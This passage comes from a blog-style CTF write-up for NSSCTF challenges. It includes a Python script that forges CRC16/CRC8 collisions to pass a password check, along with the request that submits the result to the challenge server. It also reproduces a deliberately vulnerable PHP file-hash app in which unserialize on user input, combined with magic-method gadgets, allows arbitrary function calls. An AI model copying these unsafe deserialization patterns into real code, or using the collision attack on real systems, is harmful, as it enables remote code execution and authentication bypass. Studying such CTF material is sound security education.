function_">as_hex</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> b.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_printable</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = b.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(<span class="number">0x20</span> &lt;= c &lt; <span class="number">0x7f</span> <span class="keyword">for</span> c <span class="keyword">in</span> b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&quot;Find a different message with same CRC16+CRC8 as secret (same length).&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--secret&quot;</span>, required=<span class="literal">True</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;the secret string (exact bytes).&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--k&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">3</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;number of byte positions to allow flipping (default 3).&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--tries&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">2000</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;random bases to try per positions set.&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--seed&quot;</span>, <span class="built_in">type</span>=<span class="keyword">lambda</span> s: <span class="built_in">int</span>(s, <span class="number">0</span>), default=<span class="number">0x414141</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;random seed (accepts decimal or hex, e.g. 0x414141).&quot;</span>)</span><br><span class="line">    args = p.parse_args()</span><br><span class="line"></span><br><span class="line">    secret = args.secret.encode(<span class="string">&#x27;latin1&#x27;</span>)  <span class="comment"># allow raw bytes via latin1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Secret:&quot;</span>, secret)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Secret hex:&quot;</span>, as_hex(secret))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Secret CRC16=0x%04x, CRC8=0x%02x, combined=0x%06x&quot;</span> %</span><br><span class="line">          (compute_crc16(secret), compute_crc8(secret), crc24(secret)))</span><br><span class="line">    result = find_collision(</span><br><span class="line">        secret, k=args.k, tries_per_positions_set=args.tries, seed=args.seed)</span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No collision found. Try increasing k or the number of tries, or provide specific position sets.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    cand = result[<span class="string">&quot;candidate&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Found candidate:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Candidate bytes repr:&quot;</span>, cand)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Candidate hex:&quot;</span>, as_hex(cand))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Candidate CRC16=0x%04x, CRC8=0x%02x&quot;</span> %</span><br><span class="line">          (compute_crc16(cand), compute_crc8(cand)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Positions used:&quot;</span>, result[<span class="string">&quot;positions&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Base used:&quot;</span>, as_hex(result[<span class="string">&quot;base&quot;</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Printable?:&quot;</span>, is_printable(cand))</span><br><span class="line">    <span class="comment"># If printable is desired but candidate not printable, user can try different settings or try small brute force on chosen positions.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure><p><code>exp.py --secret &quot;Enj0yNSSCTF4th!&quot; --k 3 --tries 2000 --seed 0x414141</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">candidate = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;2619576310042a5bbf7c24dfa47780&quot;</span>)</span><br><span class="line">r = requests.post(<span class="string">&quot;http://node9.anna.nssctf.cn:29070/&quot;</span>,</span><br><span class="line">                  data=&#123;<span class="string">&quot;pass&quot;</span>: candidate&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h2 id="mpgafilesystem"><a class="markdownIt-Anchor" href="#mpgafilesystem"></a> [mpga]filesystem</h2><p></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationContext</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contextName</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contextName = <span class="string">&#x27;ApplicationContext&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contextName = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;contextName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ContentProcessor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$processedContent</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callbackFunction</span>;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processedContent = <span class="keyword">new</span> <span class="title class_">FunctionInvoker</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;<span class="variable">$key</span>) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;callbackFunction)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;callbackFunction&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileManager</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$targetFile</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$responseData</span> = <span class="string">&#x27;default_response&#x27;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$targetFile</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;targetFile = <span class="variable">$targetFile</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterPath</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="variable">$this</span>-&gt;targetFile))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performWriteOperation</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">        </span><br><span class="line">        <span class="variable">$targetObject</span> = <span class="variable language_">$this</span>-&gt;targetFile; </span><br><span class="line">        <span class="variable">$value</span> = <span class="variable">$targetObject</span>-&gt;<span class="variable">$var</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileHash</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterPath</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">                <span class="variable">$md5_hash</span> = <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;targetFile);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;MD5: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$md5_hash</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$md5_hash</span> = <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;targetFile);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;MD5 (): &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$md5_hash</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">TypeError</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;MD5: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>];</span><br><span class="line">            <span class="variable">$var</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$method</span>(<span class="variable">$var</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;responseData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInvoker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$functionName</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$functionArguments</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] : <span class="string">&#x27;home&#x27;</span>;</span><br><span class="line"><span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="variable">$upload_dir</span> = <span class="string">&quot;upload/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$upload_dir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;upload_file&#x27;</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="variable">$allowed_extensions</span> = [<span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="variable">$file_extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="keyword">isset</span>(<span class="variable">$file_info</span>[<span class="string">&#x27;extension&#x27;</span>]) ? <span class="variable">$file_info</span>[<span class="string">&#x27;extension&#x27;</span>] : <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_extension</span>, <span class="variable">$allowed_extensions</span>)) &#123;</span><br><span class="line">                <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt; txt, png, gif, jpg&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$unique_filename</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>() . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file_extension</span>;</span><br><span class="line">                <span class="variable">$upload_path</span> = <span class="variable">$upload_dir</span> . <span class="variable">$unique_filename</span>;</span><br><span class="line">                <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_path</span>)) &#123;</span><br><span class="line">                    <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-green-600&#x27;&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">                    <span class="variable">$output</span> .= <span class="string">&quot;&lt;p class=&#x27;text-gray-700&#x27;&gt;&lt;code class=&#x27;bg-gray-200 p-1 rounded&#x27;&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$upload_path</span>) . <span class="string">&quot;&lt;/code&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;home&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit_md5&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename_param</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file_to_check&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;file_to_check&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$filename_param</span>)) &#123;</span><br><span class="line">        <span class="variable">$file_object</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$filename_param</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_object</span> === <span class="literal">false</span> || !(<span class="variable">$file_object</span> <span class="keyword">instanceof</span> FileManager)) &#123;</span><br><span class="line">            <span class="variable">$file_object</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>(<span class="variable">$filename_param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$output</span> = <span class="variable">$file_object</span>-&gt;<span class="title function_ invoke__">getFileHash</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-gray-600&#x27;&gt;MD5&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.tailwindcss.com&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: <span class="string">&#x27;Inter&#x27;</span>, sans-serif;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body <span class="class"><span class="keyword">class</span>=&quot;<span class="title">bg</span>-<span class="title">gray</span>-100 <span class="title">flex</span> <span class="title">items</span>-<span class="title">center</span> <span class="title">justify</span>-<span class="title">center</span> <span class="title">min</span>-<span class="title">h</span>-<span class="title">screen</span> <span class="title">px</span>-4 <span class="title">py</span>-8&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">bg</span>-<span class="title">white</span> <span class="title">p</span>-6 <span class="title">md</span>:<span class="title">p</span>-8 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">shadow</span>-<span class="title">md</span> <span class="title">w</span>-<span class="title">full</span> <span class="title">max</span>-<span class="title">w</span>-4<span class="title">xl</span> <span class="title">mx</span>-<span class="title">auto</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">text</span>-3<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-6 <span class="title">text</span>-<span class="title">gray</span>-800 <span class="title">text</span>-<span class="title">center</span>&quot;&gt;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">flex</span> <span class="title">justify</span>-<span class="title">center</span> <span class="title">mb</span>-6 <span class="title">space</span>-<span class="title">x</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">action</span>=<span class="title">home</span>&quot; <span class="title">class</span>=&quot;<span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">action</span> === &#x27;<span class="title">home</span>&#x27; ? &#x27;<span class="title">bg</span>-<span class="title">indigo</span>-600 <span class="title">text</span>-<span class="title">white</span>&#x27; : &#x27;<span class="title">bg</span>-<span class="title">indigo</span>-100 <span class="title">text</span>-<span class="title">indigo</span>-800 <span class="title">hover</span>:<span class="title">bg</span>-<span class="title">indigo</span>-200&#x27;; ?&gt;&quot;&gt;&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">action</span>=<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">action</span> === &#x27;<span class="title">upload_file</span>&#x27; ? &#x27;<span class="title">bg</span>-<span class="title">blue</span>-600 <span class="title">text</span>-<span class="title">white</span>&#x27; : &#x27;<span class="title">bg</span>-<span class="title">blue</span>-100 <span class="title">text</span>-<span class="title">blue</span>-800 <span class="title">hover</span>:<span class="title">bg</span>-<span class="title">blue</span>-200&#x27;; ?&gt;&quot;&gt;&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">action</span> === &#x27;<span class="title">home</span>&#x27;): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">lg</span> <span class="title">text</span>-<span class="title">gray</span>-700 <span class="title">mb</span>-4&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-500 <span class="title">mb</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">                    <span class="title">md5</span></span></span><br><span class="line"><span class="class">                &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">text</span>-2<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-4 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">max</span>-<span class="title">h</span>-60 <span class="title">overflow</span>-<span class="title">y</span>-<span class="title">auto</span> <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">p</span>-2 <span class="title">bg</span>-<span class="title">gray</span>-50&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                    $<span class="title">files</span> = <span class="title">array_diff</span>(<span class="title">scandir</span>($<span class="title">upload_dir</span>), <span class="title">array</span>(&#x27;.&#x27;, &#x27;..&#x27;));</span></span><br><span class="line"><span class="class">                    <span class="title">if</span> (<span class="title">empty</span>($<span class="title">files</span>)) </span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;text-gray-500&#x27;&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;ul class=&#x27;text-left space-y-2&#x27;&gt;&quot;</span>;</span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                            <span class="variable">$file_path</span> = <span class="variable">$upload_dir</span> . <span class="variable">$file</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;li class=&#x27;flex items-center justify-between p-2 bg-white rounded-md shadow-sm&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;span class=&#x27;text-gray-700 break-all mr-2&#x27;&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file</span>) . <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;flex space-x-2&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file_path</span>) . <span class="string">&quot;&#x27; download class=&#x27;bg-blue-500 hover:bg-blue-600 text-white text-xs py-1 px-2 rounded-lg transition duration-300 ease-in-out&#x27;&gt;&lt;/a&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&#x27;?action=home&#x27; method=&#x27;POST&#x27; class=&#x27;inline-block&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;file_to_check&#x27; value=&#x27;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file_path</span>) . <span class="string">&quot;&#x27;&gt;&quot;</span>; </span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;button type=&#x27;submit&#x27; name=&#x27;submit_md5&#x27; class=&#x27;bg-purple-500 hover:bg-purple-600 text-white text-xs py-1 px-2 rounded-lg transition duration-300 ease-in-out&#x27;&gt;MD5&lt;/button&gt;&quot;</span>; </span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/form&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;/ul&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$output</span>)): <span class="meta">?&gt;</span></span><br><span class="line">                    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">p</span>-4 <span 